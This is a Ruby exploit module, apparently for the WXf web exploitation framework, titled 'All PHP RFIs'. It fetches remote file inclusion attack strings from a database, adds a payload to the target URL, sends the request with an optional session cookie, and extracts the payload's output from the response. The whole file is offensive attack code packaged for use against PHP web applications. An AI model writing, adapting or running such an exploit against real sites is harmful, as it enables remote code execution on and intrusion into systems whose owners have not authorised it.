

class WebXploit <  WXf::WXfmod_Factory::Exploit

  include WXf::WXfassists::Exploit::RFI
  include WXf::WXfassists::General::MechReq
  
  def initialize
        super( 
    'Name'        => 'All PHP RFIs',
    'Version'     => '1.0',
    'Description' => %q{
      Allows you to pull RFI attack strings out of the database. You can choose an RFI string and send off the request.                        },
    'References'  =>
     [
        [ 'URL', 'http://example.com/' ]
       
     ],
    'Author'      => [ 'CKTRICKY' ],
    'License'     => WXF_LICENSE,
    'Payload'     => true
 )
     init_opts([
       OptString.new('RFI', [true, "Enter the RFI by name", ""]),
       OptString.new('COOKIE', [true, "Example: uniquecookie=cookievalue", nil])
      ])
      
  end

  def exploit
    rfi = datahash['RFI']
    str = fetch_rfi_string_by_name(rfi)
    url = rurl + str + payload.payload_data
    cookie =  datahash['COOKIE']
  
    if requires_auth?(rfi) == true
      if not cookie == ''
        res = mech_req({
          'method'     => 'GET',
          'RURL'       => url,
          'HEADERS'    => {'Cookie' => cookie}
        })
      else
        prnt_err("Please enter a cookie value")
      end
    else
      res = mech_req({
      'method'     => 'GET',
      'RURL'       => url,
      })
    end
    
      if (rce_code)
        prnt_err("The following error has occured: #{rce_code}")
      end
      
      if (res) and (res.respond_to?('body'))
        payload.payload_extraction(res.body)
      end
      
  end
 
        
          
    
end
